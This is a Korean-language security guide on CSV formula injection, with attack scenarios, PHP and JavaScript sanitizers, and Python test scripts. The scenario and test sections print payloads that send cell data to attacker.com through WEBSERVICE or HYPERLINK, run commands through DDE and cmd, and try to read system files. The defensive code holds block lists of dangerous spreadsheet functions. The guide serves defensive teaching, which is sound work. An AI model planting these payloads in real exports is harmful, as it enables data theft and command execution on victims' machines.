# CSV Injection 취약점 분석

## 📋 취약점 개요

**CSV Injection (Formula Injection)**은 사용자 입력이 CSV 파일로 내보내질 때 스프레드시트 애플리케이션(Excel, Google Sheets 등)에서 실행될 수 있는 수식이 포함되어 발생하는 취약점입니다. 공격자가 악성 수식을 삽입하여 로컬 파일 접근이나 원격 서버 연결을 시도할 수 있습니다.

### 🎯 공격 원리

1. **수식 문자 삽입**: `=`, `+`, `-`, `@` 등으로 시작하는 수식 삽입
2. **스프레드시트 실행**: 사용자가 CSV 파일을 열 때 수식 자동 실행
3. **데이터 유출**: 로컬 파일이나 다른 셀의 데이터를 외부로 전송
4. **원격 실행**: 매크로나 외부 프로그램 실행 시도

### 🔍 주요 위험성

- **CVSS 점수**: 6.1 (Medium)
- **데이터 유출**: 민감한 정보의 외부 전송
- **로컬 파일 접근**: 시스템 파일 읽기 시도
- **피싱 공격**: 사용자를 악성 사이트로 유도

## 🚨 공격 시나리오

### 시나리오 1: 기본 수식 주입

```php
<?php
// 취약한 CSV 출력 코드
$data = [
    ['Name', 'Email', 'Comments'],
    ['John', 'john@example.com', '=2+3'],  // 수식이 실행됨
    ['Jane', 'jane@example.com', '=HYPERLINK("http://evil.com","Click me")'],
    ['Bob', 'bob@example.com', '=cmd|"/c calc"!A0']  // 명령 실행 시도
];

header('Content-Type: text/csv');
header('Content-Disposition: attachment; filename="export.csv"');

foreach ($data as $row) {
    echo implode(',', $row) . "\n";
}
?>
```

### 시나리오 2: 데이터 유출 공격

```csv
# 악성 CSV 페이로드
Name,Email,Comments
"John","john@example.com","=HYPERLINK(CONCATENATE(""http://attacker.com/steal?data="",A2,""&email="",B2),""Click for discount"")"
"Jane","jane@example.com","=WEBSERVICE(""http://attacker.com/collect?user=""&A2)"
```

### 시나리오 3: 로컬 파일 접근

```csv
# 로컬 파일 읽기 시도
Name,Phone,Address
"Test User","123-456-7890","=WEBSERVICE(""http://attacker.com/log?file=""&INDIRECT(""../../../etc/passwd""))"
"Admin","555-0000","=DDE(""cmd"",""/c type C:\\Windows\\System32\\drivers\\etc\\hosts"",""csv"")"
```

### 시나리오 4: 피싱 공격

```csv
# 피싱 링크 생성
Product,Price,Details
"Special Offer","$99","=HYPERLINK(""http://phishing-site.com/login"",""Update Payment Info"")"
"Premium Plan","$199","=HYPERLINK(""javascript:alert('XSS')"",""Click Here"")"
```

## 🛡️ 방어 방법

### 1. 기본적인 CSV 이스케이핑

```php
<?php
class SafeCSVExporter {
    private $dangerous_chars = ['=', '+', '-', '@'];
    
    public function sanitizeCell($value) {
        $value = (string)$value;
        
        // 위험한 문자로 시작하는지 확인
        if (!empty($value) && in_array($value[0], $this->dangerous_chars)) {
            // 앞에 탭이나 작은따옴표 추가
            $value = "'" . $value;
        }
        
        return $value;
    }
    
    public function exportToCSV($data, $filename) {
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        
        $output = fopen('php://output', 'w');
        
        foreach ($data as $row) {
            $sanitized_row = array_map([$this, 'sanitizeCell'], $row);
            fputcsv($output, $sanitized_row);
        }
        
        fclose($output);
    }
}

// 사용 예제
$exporter = new SafeCSVExporter();
$data = [
    ['Name', 'Email', 'Comments'],
    ['John', 'john@example.com', '=SUM(1,2)'],  // 안전하게 처리됨
    ['Jane', 'jane@example.com', 'Normal comment']
];

$exporter->exportToCSV($data, 'safe_export.csv');
?>
```

### 2. 고급 CSV 보안 처리

```php
<?php
class AdvancedCSVSecurity {
    private $config;
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'escape_formulas' => true,
            'remove_hyperlinks' => true,
            'sanitize_functions' => true,
            'escape_character' => "'",
            'max_cell_length' => 32767,  // Excel 제한
            'allowed_functions' => []     // 허용된 함수 목록 (빈 배열 = 모든 함수 차단)
        ], $config);
    }
    
    public function sanitizeValue($value) {
        $value = (string)$value;
        
        // 길이 제한
        if (strlen($value) > $this->config['max_cell_length']) {
            $value = substr($value, 0, $this->config['max_cell_length']);
        }
        
        // 수식 이스케이핑
        if ($this->config['escape_formulas']) {
            $value = $this->escapeFormulas($value);
        }
        
        // 하이퍼링크 제거
        if ($this->config['remove_hyperlinks']) {
            $value = $this->removeHyperlinks($value);
        }
        
        // 위험한 함수 제거
        if ($this->config['sanitize_functions']) {
            $value = $this->sanitizeFunctions($value);
        }
        
        return $value;
    }
    
    private function escapeFormulas($value) {
        $dangerous_chars = ['=', '+', '-', '@', '\t', '\r'];
        
        if (!empty($value) && in_array($value[0], $dangerous_chars)) {
            return $this->config['escape_character'] . $value;
        }
        
        return $value;
    }
    
    private function removeHyperlinks($value) {
        // HYPERLINK 함수 제거
        $patterns = [
            '/=HYPERLINK\s*\(/i',
            '/HYPERLINK\s*\(/i',
            '/=WEBSERVICE\s*\(/i',
            '/WEBSERVICE\s*\(/i'
        ];
        
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $value)) {
                return $this->config['escape_character'] . $value;
            }
        }
        
        return $value;
    }
    
    private function sanitizeFunctions($value) {
        $dangerous_functions = [
            'WEBSERVICE', 'HYPERLINK', 'IMPORTXML', 'IMPORTHTML',
            'IMPORTDATA', 'IMPORTRANGE', 'IMPORTFEED', 'DDE',
            'CMD', 'EXEC', 'SYSTEM', 'SHELL'
        ];
        
        foreach ($dangerous_functions as $func) {
            if (stripos($value, $func . '(') !== false) {
                return $this->config['escape_character'] . $value;
            }
        }
        
        return $value;
    }
    
    public function exportSecureCSV($data, $filename, $headers = []) {
        // 보안 헤더 설정
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        
        $output = fopen('php://output', 'w');
        
        // UTF-8 BOM 추가 (Excel 호환성)
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF));
        
        // 헤더 추가
        if (!empty($headers)) {
            fputcsv($output, array_map([$this, 'sanitizeValue'], $headers));
        }
        
        // 데이터 처리
        foreach ($data as $row) {
            $sanitized_row = array_map([$this, 'sanitizeValue'], $row);
            fputcsv($output, $sanitized_row);
        }
        
        fclose($output);
    }
    
    public function validateCSVContent($content) {
        $violations = [];
        $lines = explode("\n", $content);
        
        foreach ($lines as $line_num => $line) {
            $cells = str_getcsv($line);
            
            foreach ($cells as $cell_num => $cell) {
                if ($this->containsDangerousContent($cell)) {
                    $violations[] = [
                        'line' => $line_num + 1,
                        'cell' => $cell_num + 1,
                        'content' => $cell,
                        'risk' => $this->assessRisk($cell)
                    ];
                }
            }
        }
        
        return $violations;
    }
    
    private function containsDangerousContent($value) {
        $patterns = [
            '/^[=+\-@]/',  // 수식 시작 문자
            '/HYPERLINK\s*\(/i',
            '/WEBSERVICE\s*\(/i',
            '/DDE\s*\(/i',
            '/IMPORTXML\s*\(/i',
            '/CMD\s*\(/i'
        ];
        
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $value)) {
                return true;
            }
        }
        
        return false;
    }
    
    private function assessRisk($value) {
        if (stripos($value, 'WEBSERVICE') !== false || 
            stripos($value, 'HYPERLINK') !== false) {
            return 'HIGH';
        }
        
        if (stripos($value, 'DDE') !== false || 
            stripos($value, 'CMD') !== false) {
            return 'CRITICAL';
        }
        
        if (preg_match('/^[=+\-@]/', $value)) {
            return 'MEDIUM';
        }
        
        return 'LOW';
    }
}

// 사용 예제
$csvSecurity = new AdvancedCSVSecurity([
    'escape_formulas' => true,
    'remove_hyperlinks' => true,
    'sanitize_functions' => true
]);

$data = [
    ['John Doe', 'john@example.com', '=SUM(1,2)'],
    ['Jane Smith', 'jane@example.com', '=HYPERLINK("http://evil.com","Click")'],
    ['Bob Johnson', 'bob@example.com', 'Regular comment']
];

$headers = ['Name', 'Email', 'Comments'];
$csvSecurity->exportSecureCSV($data, 'secure_export.csv', $headers);
?>
```

### 3. 클라이언트 사이드 경고 시스템

```javascript
// CSV 파일 업로드 시 클라이언트 사이드 검증
class CSVSecurityValidator {
    constructor() {
        this.dangerousPatterns = [
            /^[=+\-@]/,
            /HYPERLINK\s*\(/i,
            /WEBSERVICE\s*\(/i,
            /DDE\s*\(/i,
            /IMPORTXML\s*\(/i
        ];
    }
    
    validateCSVFile(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            
            reader.onload = (e) => {
                const content = e.target.result;
                const violations = this.checkContent(content);
                
                if (violations.length > 0) {
                    resolve({
                        safe: false,
                        violations: violations,
                        recommendation: 'Remove or escape dangerous formulas before uploading'
                    });
                } else {
                    resolve({
                        safe: true,
                        violations: [],
                        recommendation: 'File appears safe'
                    });
                }
            };
            
            reader.onerror = () => reject('File reading failed');
            reader.readAsText(file);
        });
    }
    
    checkContent(content) {
        const violations = [];
        const lines = content.split('\n');
        
        lines.forEach((line, lineNum) => {
            const cells = this.parseCSVLine(line);
            
            cells.forEach((cell, cellNum) => {
                if (this.isDangerous(cell)) {
                    violations.push({
                        line: lineNum + 1,
                        cell: cellNum + 1,
                        content: cell,
                        risk: this.assessRisk(cell)
                    });
                }
            });
        });
        
        return violations;
    }
    
    parseCSVLine(line) {
        const result = [];
        let current = '';
        let inQuotes = false;
        let i = 0;
        
        while (i < line.length) {
            const char = line[i];
            
            if (char === '"' && !inQuotes) {
                inQuotes = true;
            } else if (char === '"' && inQuotes) {
                if (line[i + 1] === '"') {
                    current += '"';
                    i++; // Skip next quote
                } else {
                    inQuotes = false;
                }
            } else if (char === ',' && !inQuotes) {
                result.push(current);
                current = '';
            } else {
                current += char;
            }
            
            i++;
        }
        
        result.push(current);
        return result;
    }
    
    isDangerous(value) {
        return this.dangerousPatterns.some(pattern => pattern.test(value));
    }
    
    assessRisk(value) {
        if (/WEBSERVICE|HYPERLINK/i.test(value)) return 'HIGH';
        if (/DDE|CMD/i.test(value)) return 'CRITICAL';
        if (/^[=+\-@]/.test(value)) return 'MEDIUM';
        return 'LOW';
    }
}

// 사용 예제
const validator = new CSVSecurityValidator();

document.getElementById('csvFileInput').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (file && file.type === 'text/csv') {
        try {
            const result = await validator.validateCSVFile(file);
            
            if (!result.safe) {
                console.warn('Dangerous content detected:', result.violations);
                alert(`Warning: CSV file contains potentially dangerous formulas!\n\nViolations found: ${result.violations.length}`);
            } else {
                console.log('CSV file is safe');
            }
        } catch (error) {
            console.error('Validation failed:', error);
        }
    }
});
```

## 🧪 테스트 방법

### 1. 기본 CSV 주입 테스트

```python
import requests
import csv
import io

def test_csv_injection():
    # 테스트 페이로드들
    payloads = [
        '=2+3',
        '=HYPERLINK("http://evil.com","Click me")',
        '=WEBSERVICE("http://attacker.com/steal?data="&A1)',
        '+2+3',
        '-2+3', 
        '@SUM(1,2)',
        '=cmd|"/c calc"!A0',
        '=DDE("cmd","/c notepad","csv")'
    ]
    
    for payload in payloads:
        # 웹 폼을 통해 데이터 제출
        data = {
            'name': 'Test User',
            'email': 'test@example.com',
            'comment': payload
        }
        
        response = requests.post('http://target.com/export-csv', data=data)
        
        if response.status_code == 200:
            # CSV 내용 확인
            csv_content = response.text
            if payload in csv_content and not csv_content.startswith("'"):
                print(f"Vulnerable to CSV injection: {payload}")
            else:
                print(f"Properly escaped: {payload}")

test_csv_injection()
```

### 2. 자동화된 CSV 보안 테스트

```python
import pandas as pd
import re

class CSVInjectionTester:
    def __init__(self):
        self.dangerous_patterns = [
            r'^[=+\-@]',
            r'HYPERLINK\s*\(',
            r'WEBSERVICE\s*\(',
            r'DDE\s*\(',
            r'IMPORTXML\s*\(',
            r'CMD\s*\('
        ]
    
    def generate_test_payloads(self):
        return [
            '=1+1',
            '=HYPERLINK("http://evil.com")',
            '=WEBSERVICE("http://evil.com")',
            '+1+1',
            '-1+1',
            '@SUM(1,2)',
            '=DDE("cmd","/c calc")',
            '=IMPORTXML("http://evil.com/xml","//data")',
            "=HYPERLINK(\"http://evil.com\",\"Free Money\")",
            '=cmd|"/c dir"!A1'
        ]
    
    def test_csv_export_endpoint(self, url, data_field):
        payloads = self.generate_test_payloads()
        results = []
        
        for payload in payloads:
            test_data = {data_field: payload}
            
            try:
                response = requests.post(url, data=test_data)
                if response.status_code == 200:
                    is_vulnerable = self.check_vulnerability(response.text, payload)
                    results.append({
                        'payload': payload,
                        'vulnerable': is_vulnerable,
                        'response_snippet': response.text[:200]
                    })
            except Exception as e:
                results.append({
                    'payload': payload,
                    'vulnerable': 'ERROR',
                    'error': str(e)
                })
        
        return results
    
    def check_vulnerability(self, csv_content, payload):
        # 페이로드가 이스케이프되지 않고 그대로 나타나는지 확인
        lines = csv_content.strip().split('\n')
        
        for line in lines:
            if payload in line and not line.startswith("'"):
                return True
        
        return False
    
    def analyze_csv_file(self, file_path):
        violations = []
        
        with open(file_path, 'r', encoding='utf-8') as file:
            csv_reader = csv.reader(file)
            
            for row_num, row in enumerate(csv_reader):
                for col_num, cell in enumerate(row):
                    if self.is_dangerous_content(cell):
                        violations.append({
                            'row': row_num + 1,
                            'col': col_num + 1,
                            'content': cell,
                            'risk_level': self.assess_risk(cell)
                        })
        
        return violations
    
    def is_dangerous_content(self, content):
        for pattern in self.dangerous_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False
    
    def assess_risk(self, content):
        if re.search(r'WEBSERVICE|HYPERLINK', content, re.IGNORECASE):
            return 'HIGH'
        elif re.search(r'DDE|CMD', content, re.IGNORECASE):
            return 'CRITICAL'
        elif re.search(r'^[=+\-@]', content):
            return 'MEDIUM'
        return 'LOW'

# 사용 예제
tester = CSVInjectionTester()

# 웹 애플리케이션 테스트
results = tester.test_csv_export_endpoint('http://target.com/export', 'user_input')
for result in results:
    if result['vulnerable']:
        print(f"VULNERABLE: {result['payload']}")

# CSV 파일 분석
violations = tester.analyze_csv_file('suspicious_export.csv')
if violations:
    print(f"Found {len(violations)} potential CSV injection attempts")
```

## 📚 참고 자료

### 공식 문서
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [PayloadsAllTheThings - CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)

### 보안 가이드
- [Microsoft Office Security](https://docs.microsoft.com/en-us/office/troubleshoot/security/macro-security-level)
- [Google Sheets Security](https://support.google.com/docs/answer/58571)

### 도구 및 리소스
- [CSV Injection Prevention Libraries](https://github.com/search?q=csv+injection+prevention)
- [Burp Suite CSV Testing Extensions](https://portswigger.net/bappstore)

---

## 🎯 핵심 요약

1. **입력 이스케이핑**: 수식 시작 문자(`=`, `+`, `-`, `@`)를 이스케이프
2. **함수 필터링**: 위험한 함수(`HYPERLINK`, `WEBSERVICE` 등) 차단
3. **콘텐츠 검증**: CSV 내용의 실시간 보안 검사
4. **사용자 교육**: CSV 파일 열기 전 경고 및 확인 절차

**⚠️ 주의**: CSV Injection은 클라이언트 사이드에서 실행되므로 사용자 교육과 기술적 방어를 병행해야 합니다.